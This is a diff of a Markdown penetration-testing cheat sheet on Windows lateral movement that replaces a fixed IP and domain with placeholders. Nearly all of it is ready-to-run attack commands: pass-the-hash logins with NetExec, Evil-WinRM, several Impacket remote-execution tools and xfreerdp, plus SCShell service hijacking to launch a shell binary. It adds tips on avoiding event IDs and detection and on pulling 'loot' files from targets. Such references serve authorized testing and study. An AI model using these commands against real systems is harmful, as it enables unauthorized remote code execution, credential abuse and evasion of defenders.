@@ -12,27 +12,27 @@ Use an NTLM hash directly without cracking it. Requires local admin rights on th
 ### NetExec (credential validation + command execution)
 
 ```bash
-nxc smb 10.10.10.10 -u Administrator -H <ntlm-hash>
-nxc smb 10.10.10.10 -u Administrator -H <ntlm-hash> -x "whoami"
-nxc winrm 10.10.10.10 -u Administrator -H <ntlm-hash> -x "whoami"
+nxc smb $IP -u Administrator -H <ntlm-hash>
+nxc smb $IP -u Administrator -H <ntlm-hash> -x "whoami"
+nxc winrm $IP -u Administrator -H <ntlm-hash> -x "whoami"
 ```
 
 ### Evil-WinRM
 
 ```bash
-evil-winrm -i 10.10.10.10 -u Administrator -H <ntlm-hash>
+evil-winrm -i $IP -u Administrator -H <ntlm-hash>
 ```
 
 ### Impacket PsExec
 
 ```bash
-impacket-psexec Administrator@10.10.10.10 -hashes :<ntlm-hash>
+impacket-psexec Administrator@$IP -hashes :<ntlm-hash>
 ```
 
 ### Impacket WMIExec
 
 ```bash
-impacket-wmiexec Administrator@10.10.10.10 -hashes :<ntlm-hash>
+impacket-wmiexec Administrator@$IP -hashes :<ntlm-hash>
 ```
 
 ---
@@ -42,8 +42,8 @@ impacket-wmiexec Administrator@10.10.10.10 -hashes :<ntlm-hash>
 Most comfortable interactive shell for post-exploitation. Requires port 5985 (HTTP) or 5986 (HTTPS) and membership in the Remote Management Users group or local admin.
 
 ```bash
-evil-winrm -i 10.10.10.10 -u Administrator -p 'Password1'
-evil-winrm -i 10.10.10.10 -u Administrator -H <ntlm-hash>
+evil-winrm -i $IP -u Administrator -p 'Password1'
+evil-winrm -i $IP -u Administrator -H <ntlm-hash>
 ```
 
 Upload/download files from within an `evil-winrm` session:
@@ -60,8 +60,8 @@ download C:\Temp\loot.txt /local/loot.txt
 Creates a temporary service on the target, reliable but loud (Event ID 7045: service installed).
 
 ```bash
-impacket-psexec CORP/Administrator:'Password1'@10.10.10.10
-impacket-psexec Administrator@10.10.10.10 -hashes :<ntlm-hash>
+impacket-psexec $NETBIOS/Administrator:'Password1'@$IP
+impacket-psexec Administrator@$IP -hashes :<ntlm-hash>
 ```
 
 ---
@@ -71,9 +71,9 @@ impacket-psexec Administrator@10.10.10.10 -hashes :<ntlm-hash>
 No service creation. Generates Event ID 4688 (process creation). Preferred over PsExec when stealth matters.
 
 ```bash
-impacket-wmiexec CORP/Administrator:'Password1'@10.10.10.10
-impacket-wmiexec CORP/Administrator:'Password1'@10.10.10.10 "ipconfig /all"
-impacket-wmiexec Administrator@10.10.10.10 -hashes :<ntlm-hash>
+impacket-wmiexec $NETBIOS/Administrator:'Password1'@$IP
+impacket-wmiexec $NETBIOS/Administrator:'Password1'@$IP "ipconfig /all"
+impacket-wmiexec Administrator@$IP -hashes :<ntlm-hash>
 ```
 
 ---
@@ -81,8 +81,8 @@ impacket-wmiexec Administrator@10.10.10.10 -hashes :<ntlm-hash>
 ## RDP
 
 ```bash
-xfreerdp /u:<user> /p:<pass> /v:10.10.10.10 +clipboard +drive:smbfolder,/local/path dynamic-resolution /cert:ignore
-xfreerdp /u:<user> /pth:<ntlm-hash> /v:10.10.10.10 +clipboard +drive:smbfolder,/local/path dynamic-resolution /cert:ignore
+xfreerdp /u:<user> /p:<pass> /v:$IP +clipboard +drive:smbfolder,/local/path dynamic-resolution /cert:ignore
+xfreerdp /u:<user> /pth:<ntlm-hash> /v:$IP +clipboard +drive:smbfolder,/local/path dynamic-resolution /cert:ignore
 ```
 
 !!! warning "Watch out"
@@ -95,9 +95,9 @@ xfreerdp /u:<user> /pth:<ntlm-hash> /v:10.10.10.10 +clipboard +drive:smbfolder,/
 Try these when PsExec/WMI are blocked or flagged:
 
 ```bash
-impacket-smbexec CORP/Administrator:'Password1'@10.10.10.10
-impacket-atexec CORP/Administrator:'Password1'@10.10.10.10 "whoami"
-impacket-dcomexec CORP/Administrator:'Password1'@10.10.10.10
+impacket-smbexec $NETBIOS/Administrator:'Password1'@$IP
+impacket-atexec $NETBIOS/Administrator:'Password1'@$IP "whoami"
+impacket-dcomexec $NETBIOS/Administrator:'Password1'@$IP
 ```
 
 ---
@@ -107,7 +107,7 @@ impacket-dcomexec CORP/Administrator:'Password1'@10.10.10.10
 Modifies an existing service's `binPath`, triggers it, then restores the original, no service creation (no Event ID 7045), no file written to SMB, no named pipe. Quieter than PsExec when you have SERVICE_CHANGE_CONFIG.
 
 ```bash
-scshell.py CORP/Administrator:'Password1'@10.10.10.10 xps 'C:\Temp\shell.exe'
+scshell.py $NETBIOS/Administrator:'Password1'@$IP xps 'C:\Temp\shell.exe'
 ```
 
 Args: `<user>:<pass>@<host> <service-name> <command>`. Pick a rarely-used service like `XblAuthManager`, `RemoteRegistry`, or `Spooler` to reduce operational impact.
